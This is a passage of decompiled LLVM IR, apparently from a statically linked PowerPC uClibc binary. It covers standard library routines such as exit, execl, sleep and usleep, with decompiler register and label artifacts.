  %v0_10010bbc = phi i32 [ %v0_10010b8c, %dec_label_pc_10010ba4 ], [ %v0_10010bbc.pre, %dec_label_pc_10010bac ], [ %v0_10010b8c, %dec_label_pc_10010b88 ]
  %v3_10010bbc = icmp eq i32 %v0_10010bbc, 0
  br i1 %v3_10010bbc, label %dec_label_pc_10010bc8, label %dec_label_pc_10010bc4

dec_label_pc_10010bc4:                            ; preds = %dec_label_pc_10010bbc
  %v1_10010bc4 = sub i32 0, %v0_10010bcc.pre
  store i32 %v1_10010bc4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010bc8

dec_label_pc_10010bc8:                            ; preds = %dec_label_pc_10010bbc, %dec_label_pc_10010bc4
  %v0_10010bcc = phi i32 [ %v1_10010bc4, %dec_label_pc_10010bc4 ], [ %v0_10010bcc.pre, %dec_label_pc_10010bbc ]
  ret i32 %v0_10010bcc

; uselistorder directives
  uselistorder i32 %v0_10010bcc.pre, { 1, 0 }
  uselistorder i32 %v0_10010bcc.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_10010b74, { 1, 0 }
  uselistorder i32 %v1_10010b20, { 1, 0 }
  uselistorder i32 %v1_10010b1c, { 1, 0 }
  uselistorder i32 %v1_10010b14, { 1, 0 }
  uselistorder i32 %v3_10010b08, { 1, 0 }
  uselistorder i32 %v0_10010b70, { 1, 0, 2 }
  uselistorder i32 %v1_10010b10, { 0, 2, 1 }
  uselistorder i32 %v0_10010b04, { 1, 0 }
  uselistorder i32 %v2_10010af0, { 1, 0, 2 }
  uselistorder i32 %v1_10010ac8, { 1, 0 }
  uselistorder i32 %v1_10010ab4, { 1, 0, 2 }
  uselistorder i32 %v0_10010a90, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_10010bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10010bbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010b88, { 1, 0 }
  uselistorder label %dec_label_pc_10010b40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b08, { 1, 0 }
  uselistorder label %dec_label_pc_10010adc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010ad0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010a94, { 1, 0 }
  uselistorder label %dec_label_pc_10010a90, { 1, 0 }
  uselistorder label %dec_label_pc_10010a5c, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10010bf8 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10010c04 = load i32, i32* @r3, align 4
  store i32 %v0_10010c04, i32* @r31, align 4
  store i32 %v2_10010bf8, i32* @r3, align 4
  %v0_10010c10 = call i32 @__pthread_return_void()
  %v0_10010c18 = call i32 @__pthread_return_0()
  %v3_10010c20 = load i32, i32* @global_var_10028814.680, align 4
  %v3_10010c24 = icmp eq i32 %v3_10010c20, 0
  br i1 %v3_10010c24, label %dec_label_pc_10010c38, label %dec_label_pc_10010c2c

dec_label_pc_10010c2c:                            ; preds = %entry
  %v0_10010c2c = load i32, i32* @r31, align 4
  %v3_10010c34 = call i32 @unknown_0(i32 %v0_10010c2c, i32 268632064)
  br label %dec_label_pc_10010c38

dec_label_pc_10010c38:                            ; preds = %entry, %dec_label_pc_10010c2c
  store i32 %v2_10010bf8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10010c40 = call i32 @__pthread_return_void()
  store i32 %v0_10010c40, i32* @r3, align 4
  store i32 268504136, i32* @lr, align 4
  %v1_10010c44 = call i32 @__GI___uClibc_fini(i32 %v0_10010c40)
  store i32 268504156, i32* @lr, align 4
  %v2_10010c58 = call i32 @_stdio_term(i32 %v1_10010c44, i32 268489572)
  %v0_10010c5c = load i32, i32* @r31, align 4
  %v1_10010c60 = call i32 @__GI__exit(i32 %v0_10010c5c)
  ret i32 %v1_10010c60

; uselistorder directives
  uselistorder label %dec_label_pc_10010c38, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10010c64 = ptrtoint i32* %stack_var_0 to i32
  %v2_10010c80 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10010c80, i32* %r0.global-to-local, align 4
  %v2_10010c88 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_10010c80, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010cb4:                            ; preds = %dec_label_pc_10010ce4, %entry
  %v0_10010cb8 = phi i32 [ 0, %entry ], [ %v1_10010cb8, %dec_label_pc_10010ce4 ]
  %stack_var_-52.0 = phi i32 [ %v2_10010c88, %entry ], [ %stack_var_-52.1, %dec_label_pc_10010ce4 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_10010ce4 ]
  %v4_10010cb4 = zext i8 %stack_var_-56.0 to i32
  %v1_10010cb8 = add i32 %v0_10010cb8, 1
  %v1_10010cc0 = mul nuw nsw i32 %v4_10010cb4, 4
  store i32 %v1_10010cc0, i32* %r0.global-to-local, align 4
  %v2_10010cc4 = add i32 %v1_10010cc0, %v2_10010c80
  store i32 %v2_10010cc4, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10010cd8, label %dec_label_pc_10010cd0

dec_label_pc_10010cd0:                            ; preds = %dec_label_pc_10010cb4
  %v1_10010cc8 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10010ce4

dec_label_pc_10010cd8:                            ; preds = %dec_label_pc_10010cb4
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10010cdc = add i32 %stack_var_-52.0, 4
  store i32 %v1_10010cdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010ce4

dec_label_pc_10010ce4:                            ; preds = %dec_label_pc_10010cd0, %dec_label_pc_10010cd8
  %stack_var_-52.1 = phi i32 [ %v1_10010cdc, %dec_label_pc_10010cd8 ], [ %stack_var_-52.0, %dec_label_pc_10010cd0 ]
  %v0_10010ce4 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10010cd8 ], [ %v2_10010cc4, %dec_label_pc_10010cd0 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10010cd8 ], [ %v1_10010cc8, %dec_label_pc_10010cd0 ]
  %v1_10010ce4 = inttoptr i32 %v0_10010ce4 to i32*
  %v2_10010ce4 = load i32, i32* %v1_10010ce4, align 4
  store i32 %v2_10010ce4, i32* %r0.global-to-local, align 4
  %v3_10010ce8 = icmp eq i32 %v2_10010ce4, 0
  br i1 %v3_10010ce8, label %dec_label_pc_10010cf0, label %dec_label_pc_10010cb4

dec_label_pc_10010cf0:                            ; preds = %dec_label_pc_10010ce4
  %v1_10010cf0 = mul i32 %v1_10010cb8, 4
  store i32 %v4_10010c64, i32* %r0.global-to-local, align 4
  %v1_10010cf8 = add i32 %v1_10010cf0, 34
  store i32 %v1_10010cb8, i32* %ctr.global-to-local, align 4
  %v1_10010d00 = call i32 @__asm_rlwinm(i32 %v1_10010cf8, i32 0, i32 0, i32 27)
  %v1_10010d08 = load i32, i32* @r1, align 4
  %v3_10010d08 = sub i32 %v1_10010d08, %v1_10010d00
  %v4_10010d08 = inttoptr i32 %v3_10010d08 to i32*
  store i32 %v4_10010c64, i32* %v4_10010d08, align 4
  %v1_10010d0c = add i32 %v3_10010d08, 23
  store i32 %v1_10010d0c, i32* %r0.global-to-local, align 4
  %v1_10010d10 = call i32 @__asm_rlwinm(i32 %v1_10010d0c, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10010d18 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010d18 = inttoptr i32 %v1_10010d10 to i32*
  store i32 %v0_10010d18, i32* %v2_10010d18, align 4
  store i32 %v1_10010d10, i32* %r11.global-to-local, align 4
  %v0_10010d20 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010d20 = trunc i32 %v0_10010d20 to i8
  store i32 %v2_10010c80, i32* %r0.global-to-local, align 4
  store i32 %v2_10010c80, i32* %stack_var_-48, align 4
  br label %dec_label_pc_10010d34

dec_label_pc_10010d34:                            ; preds = %dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge, %dec_label_pc_10010cf0
  %v0_10010d38 = phi i32 [ %v1_10010d10, %dec_label_pc_10010cf0 ], [ %v0_10010d38.pre, %dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_10010c88, %dec_label_pc_10010cf0 ], [ %stack_var_-52.3, %dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10010d20, %dec_label_pc_10010cf0 ], [ %stack_var_-56.3, %dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge ]
  %v1_10010d38 = add i32 %v0_10010d38, 4
  store i32 %v1_10010d38, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_10010d5c, label %dec_label_pc_10010d4c

dec_label_pc_10010d4c:                            ; preds = %dec_label_pc_10010d34
  %v4_10010d34 = zext i8 %stack_var_-56.2 to i32
  %v1_10010d44 = add i8 %stack_var_-56.2, 1
  %v1_10010d40 = mul nuw nsw i32 %v4_10010d34, 4
  %v3_10010d4c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10010d4c, i32* %r0.global-to-local, align 4
  %v2_10010d54 = add i32 %v3_10010d4c, %v1_10010d40
  br label %dec_label_pc_10010d68

dec_label_pc_10010d5c:                            ; preds = %dec_label_pc_10010d34
  %v1_10010d60 = add i32 %stack_var_-52.2, 4
  store i32 %v1_10010d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010d68

dec_label_pc_10010d68:                            ; preds = %dec_label_pc_10010d4c, %dec_label_pc_10010d5c
  %stack_var_-52.3 = phi i32 [ %v1_10010d60, %dec_label_pc_10010d5c ], [ %stack_var_-52.2, %dec_label_pc_10010d4c ]
  %v0_10010d68 = phi i32 [ %stack_var_-52.2, %dec_label_pc_10010d5c ], [ %v2_10010d54, %dec_label_pc_10010d4c ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_10010d5c ], [ %v1_10010d44, %dec_label_pc_10010d4c ]
  %v1_10010d68 = inttoptr i32 %v0_10010d68 to i32*
  %v2_10010d68 = load i32, i32* %v1_10010d68, align 4
  store i32 %v2_10010d68, i32* %r0.global-to-local, align 4
  %v2_10010d6c = inttoptr i32 %v1_10010d38 to i32*
  store i32 %v2_10010d68, i32* %v2_10010d6c, align 4
  %v0_10010d70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010d70 = add i32 %v0_10010d70, -1
  store i32 %v1_10010d70, i32* %ctr.global-to-local, align 4
  %v2_10010d70 = icmp eq i32 %v1_10010d70, 0
  br i1 %v2_10010d70, label %dec_label_pc_10010d74, label %dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge

dec_label_pc_10010d68.dec_label_pc_10010d34_crit_edge: ; preds = %dec_label_pc_10010d68
  %v0_10010d38.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010d34

dec_label_pc_10010d74:                            ; preds = %dec_label_pc_10010d68
  %v3_10010d78 = load i32, i32* @global_var_1002881c.682, align 4
  store i32 268504448, i32* @lr, align 4
  %v2_10010d7c = call i32 @__GI_execve(i32 %v3_10010d78, i32 268632064)
  %v0_10010d80 = load i32, i32* @r1, align 4
  %v1_10010d80 = inttoptr i32 %v0_10010d80 to i32*
  %v2_10010d80 = load i32, i32* %v1_10010d80, align 4
  store i32 %v2_10010d80, i32* %r11.global-to-local, align 4
  %v1_10010d84 = add i32 %v2_10010d80, 4
  %v2_10010d84 = inttoptr i32 %v1_10010d84 to i32*
  %v3_10010d84 = load i32, i32* %v2_10010d84, align 4
  store i32 %v3_10010d84, i32* %r0.global-to-local, align 4
  ret i32 %v2_10010d7c

; uselistorder directives
  uselistorder i32 %v1_10010d70, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10010cc0, { 1, 0 }
  uselistorder i32 %v1_10010cb8, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10010c80, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8 1, { 0, 1, 11, 12, 2, 3, 13, 10, 14, 9, 8, 7, 6, 5, 4, 15 }
  uselistorder label %dec_label_pc_10010d68, { 1, 0 }
  uselistorder label %dec_label_pc_10010ce4, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10010d98 = icmp eq i32 %arg1, 0
  br i1 %v3_10010d98, label %dec_label_pc_10010f4c, label %dec_label_pc_10010dc8.lr.ph

dec_label_pc_10010dc8.lr.ph:                      ; preds = %entry
  %v2_10010dbc = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10010dbc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10010dc842 = add i32 %v2_10010dbc, 132
  %v3_10010dc843 = inttoptr i32 %v2_10010dc842 to i32*
  store i32 0, i32* %v3_10010dc843, align 4
  %v0_10010dcc44 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010dcc45 = add i32 %v0_10010dcc44, -1
  store i32 %v1_10010dcc45, i32* %r11.global-to-local, align 4
  %v1_10010dd046 = mul i32 %v1_10010dcc45, 4
  %v1_10010dd447 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010dd448 = add i32 %v1_10010dd447, %v1_10010dd046
  %v0_10010dd849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010dd850 = add i32 %v0_10010dd849, -1
  store i32 %v1_10010dd850, i32* %ctr.global-to-local, align 4
  %v2_10010dd851 = icmp eq i32 %v1_10010dd850, 0
  br i1 %v2_10010dd851, label %dec_label_pc_10010ddc, label %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge

dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge: ; preds = %dec_label_pc_10010dc8.lr.ph, %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge
  %v2_10010dd452 = phi i32 [ %v2_10010dd4, %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge ], [ %v2_10010dd448, %dec_label_pc_10010dc8.lr.ph ]
  %v0_10010dc8.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10010dc8 = add i32 %v2_10010dd452, 8
  %v3_10010dc8 = inttoptr i32 %v2_10010dc8 to i32*
  store i32 %v0_10010dc8.pre, i32* %v3_10010dc8, align 4
  %v0_10010dcc = load i32, i32* %r11.global-to-local, align 4
  %v1_10010dcc = add i32 %v0_10010dcc, -1
  store i32 %v1_10010dcc, i32* %r11.global-to-local, align 4
  %v1_10010dd0 = mul i32 %v1_10010dcc, 4
  %v1_10010dd4 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010dd4 = add i32 %v1_10010dd4, %v1_10010dd0
  %v0_10010dd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010dd8 = add i32 %v0_10010dd8, -1
  store i32 %v1_10010dd8, i32* %ctr.global-to-local, align 4
  %v2_10010dd8 = icmp eq i32 %v1_10010dd8, 0
  br i1 %v2_10010dd8, label %dec_label_pc_10010ddc, label %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge

dec_label_pc_10010ddc:                            ; preds = %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge, %dec_label_pc_10010dc8.lr.ph
  %v0_10010df0.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10010ddc = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10010ddc, i32* %r29.global-to-local, align 4
  store i32 %v2_10010ddc, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_10010df0.pre, i32* %stack_var_-440, align 4
  %v0_10010df4 = call i32 @__sigaddset()
  store i32 %v0_10010df4, i32* %r3.global-to-local, align 4
  %v1_10010df8 = icmp slt i32 %v0_10010df4, 0
  br i1 %v1_10010df8, label %dec_label_pc_10010f54, label %dec_label_pc_10010e00

dec_label_pc_10010e00:                            ; preds = %dec_label_pc_10010ddc
  %v2_10010e00 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10010e00, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268504596, i32* @lr, align 4
  %v3_10010e10 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10010ddc, i32 %v2_10010e00)
  store i32 %v3_10010e10, i32* %r3.global-to-local, align 4
  %v3_10010e14 = icmp eq i32 %v3_10010e10, 0
  br i1 %v3_10010e14, label %dec_label_pc_10010e1c, label %dec_label_pc_10010f54

dec_label_pc_10010e1c:                            ; preds = %dec_label_pc_10010e00
  store i32 %v2_10010e00, i32* %r3.global-to-local, align 4
  %v2_10010e24 = call i32 @__sigismember(i32 %v2_10010e00, i32 17)
  store i32 %v2_10010e24, i32* %r3.global-to-local, align 4
  %v3_10010e28 = icmp eq i32 %v2_10010e24, 0
  br i1 %v3_10010e28, label %dec_label_pc_10010e48.lr.ph, label %dec_label_pc_10010f14

dec_label_pc_10010e48.lr.ph:                      ; preds = %dec_label_pc_10010e1c
  store i32 %v2_10010dbc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10010dc843, align 4
  %v0_10010e4c33 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010e4c34 = add i32 %v0_10010e4c33, -1
  store i32 %v1_10010e4c34, i32* %r11.global-to-local, align 4
  %v1_10010e5035 = mul i32 %v1_10010e4c34, 4
  %v1_10010e5436 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010e5437 = add i32 %v1_10010e5436, %v1_10010e5035
  %v0_10010e5838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010e5839 = add i32 %v0_10010e5838, -1
  store i32 %v1_10010e5839, i32* %ctr.global-to-local, align 4
  %v2_10010e5840 = icmp eq i32 %v1_10010e5839, 0
  br i1 %v2_10010e5840, label %dec_label_pc_10010e5c, label %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge

dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge: ; preds = %dec_label_pc_10010e48.lr.ph, %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge
  %v2_10010e5441 = phi i32 [ %v2_10010e54, %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge ], [ %v2_10010e5437, %dec_label_pc_10010e48.lr.ph ]
  %v0_10010e48.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10010e48 = add i32 %v2_10010e5441, 8
  %v3_10010e48 = inttoptr i32 %v2_10010e48 to i32*
  store i32 %v0_10010e48.pre, i32* %v3_10010e48, align 4
  %v0_10010e4c = load i32, i32* %r11.global-to-local, align 4
  %v1_10010e4c = add i32 %v0_10010e4c, -1
  store i32 %v1_10010e4c, i32* %r11.global-to-local, align 4
  %v1_10010e50 = mul i32 %v1_10010e4c, 4
  %v1_10010e54 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010e54 = add i32 %v1_10010e54, %v1_10010e50
  %v0_10010e58 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010e58 = add i32 %v0_10010e58, -1
  store i32 %v1_10010e58, i32* %ctr.global-to-local, align 4
  %v2_10010e58 = icmp eq i32 %v1_10010e58, 0
  br i1 %v2_10010e58, label %dec_label_pc_10010e5c, label %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge

dec_label_pc_10010e5c:                            ; preds = %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge, %dec_label_pc_10010e48.lr.ph
  store i32 %v2_10010ddc, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_10010e64 = call i32 @__sigaddset()
  store i32 %v0_10010e64, i32* %r3.global-to-local, align 4
  %v1_10010e68 = icmp slt i32 %v0_10010e64, 0
  br i1 %v1_10010e68, label %dec_label_pc_10010f54, label %dec_label_pc_10010e70

dec_label_pc_10010e70:                            ; preds = %dec_label_pc_10010e5c
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10010e78 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268504704, i32* @lr, align 4
  %v4_10010e7c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_10010e78)
  store i32 %v4_10010e7c, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_10010e7c, -1
  br i1 %tmp30, label %dec_label_pc_10010eb0, label %dec_label_pc_10010e88

dec_label_pc_10010e88:                            ; preds = %dec_label_pc_10010e70
  %v0_10010e88 = call i32 @__errno_location()
  store i32 %v0_10010e88, i32* %r3.global-to-local, align 4
  %v1_10010e90 = inttoptr i32 %v0_10010e88 to i32*
  %v2_10010e90 = load i32, i32* %v1_10010e90, align 4
  store i32 %v0_10010e88, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268504740, i32* @lr, align 4
  %v3_10010ea0 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010e00, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10010ea8 = inttoptr i32 %v0_10010e88 to i32*
  store i32 %v2_10010e90, i32* %v2_10010ea8, align 4
  %v0_10010f68.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010eb0:                            ; preds = %dec_label_pc_10010e70
  %v3_10010eb0 = load i32, i32* %stack_var_-176, align 4
  %v3_10010ebc = icmp eq i32 %v3_10010eb0, 1
  br i1 %v3_10010ebc, label %dec_label_pc_10010ec4, label %dec_label_pc_10010ef8

dec_label_pc_10010ec4:                            ; preds = %dec_label_pc_10010eb0
  store i32 %v2_10010dbc, i32* %r3.global-to-local, align 4
  store i32 268504784, i32* @lr, align 4
  %v2_10010ecc = call i32 @__libc_nanosleep(i32 %v2_10010dbc, i32 %v2_10010dbc)
  store i32 %v2_10010ecc, i32* %r3.global-to-local, align 4
  store i32 %v2_10010ecc, i32* @r31, align 4
  %v0_10010ed4 = call i32 @__errno_location()
  store i32 %v0_10010ed4, i32* %r3.global-to-local, align 4
  store i32 %v0_10010ed4, i32* %r29.global-to-local, align 4
  %v1_10010ee4 = inttoptr i32 %v0_10010ed4 to i32*
  %v2_10010ee4 = load i32, i32* %v1_10010ee4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268504816, i32* @lr, align 4
  %v3_10010eec = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010e00, i32 0)
  store i32 %v3_10010eec, i32* %r3.global-to-local, align 4
  %v1_10010ef0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010ef0 = inttoptr i32 %v1_10010ef0 to i32*
  store i32 %v2_10010ee4, i32* %v2_10010ef0, align 4
  %v0_10010f20.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010f20

dec_label_pc_10010ef8:                            ; preds = %dec_label_pc_10010eb0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268504840, i32* @lr, align 4
  %v3_10010f04 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010e00, i32 0)
  br label %dec_label_pc_10010f14

dec_label_pc_10010f14:                            ; preds = %dec_label_pc_10010e1c, %dec_label_pc_10010ef8
  store i32 %v2_10010dbc, i32* %r3.global-to-local, align 4
  store i32 268504860, i32* @lr, align 4
  %v2_10010f18 = call i32 @__libc_nanosleep(i32 %v2_10010dbc, i32 %v2_10010dbc)
  store i32 %v2_10010f18, i32* %r3.global-to-local, align 4
  store i32 %v2_10010f18, i32* @r31, align 4
  br label %dec_label_pc_10010f20

dec_label_pc_10010f20:                            ; preds = %dec_label_pc_10010ec4, %dec_label_pc_10010f14
  %v0_10010f20 = phi i32 [ %v0_10010f20.pr, %dec_label_pc_10010ec4 ], [ %v2_10010f18, %dec_label_pc_10010f14 ]
  %v3_10010f20 = icmp eq i32 %v0_10010f20, 0
  br i1 %v3_10010f20, label %dec_label_pc_10010f4c, label %dec_label_pc_10010f28

dec_label_pc_10010f28:                            ; preds = %dec_label_pc_10010f20
  %v3_10010f38 = load i32, i32* %stack_var_-440, align 4
  %v0_10010f3c = call i32 @__asm_mfcr()
  store i32 %v0_10010f3c, i32* %r3.global-to-local, align 4
  %v1_10010f40 = call i32 @__asm_rlwinm(i32 %v0_10010f3c, i32 30, i32 31, i32 31)
  %v2_10010f44 = add i32 %v3_10010f38, %v1_10010f40
  store i32 %v2_10010f44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010f4c:                            ; preds = %dec_label_pc_10010f20, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010f54:                            ; preds = %dec_label_pc_10010e00, %dec_label_pc_10010e5c, %dec_label_pc_10010ddc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010f58:                            ; preds = %dec_label_pc_10010f4c, %dec_label_pc_10010f28, %dec_label_pc_10010e88, %dec_label_pc_10010f54
  %v0_10010f68 = phi i32 [ 0, %dec_label_pc_10010f4c ], [ %v2_10010f44, %dec_label_pc_10010f28 ], [ %v0_10010f68.pre, %dec_label_pc_10010e88 ], [ -1, %dec_label_pc_10010f54 ]
  ret i32 %v0_10010f68

; uselistorder directives
  uselistorder i32 %v1_10010e58, { 1, 0 }
  uselistorder i32 %v2_10010e00, { 2, 1, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_10010dd8, { 1, 0 }
  uselistorder i32 %v2_10010dbc, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 6, 7, 0, 1, 5, 8, 9, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 6, 7, 0, 1, 5, 8, 9, 2, 3 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_10010f58, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10010f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010f20, { 1, 0 }
  uselistorder label %dec_label_pc_10010f14, { 1, 0 }
  uselistorder label %dec_label_pc_10010e48.dec_label_pc_10010e48_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10010dc8.dec_label_pc_10010dc8_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10010f88 = udiv i32 %arg1, 1000000
  %v2_10010f8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10010f88, i32* %stack_var_-24, align 4
  store i32 268505000, i32* @lr, align 4
  %v2_10010fa4 = call i32 @__libc_nanosleep(i32 %v2_10010f8c, i32 0)
  ret i32 %v2_10010fa4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 0, 2, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10011008:
  %v3_1001100c = load i32, i32* @global_var_10028824.684, align 4
  %v3_10011010 = icmp eq i32 %v3_1001100c, 0
  br i1 %v3_10011010, label %dec_label_pc_10011020, label %dec_label_pc_10011018

dec_label_pc_10011018:                            ; preds = %dec_label_pc_10011008
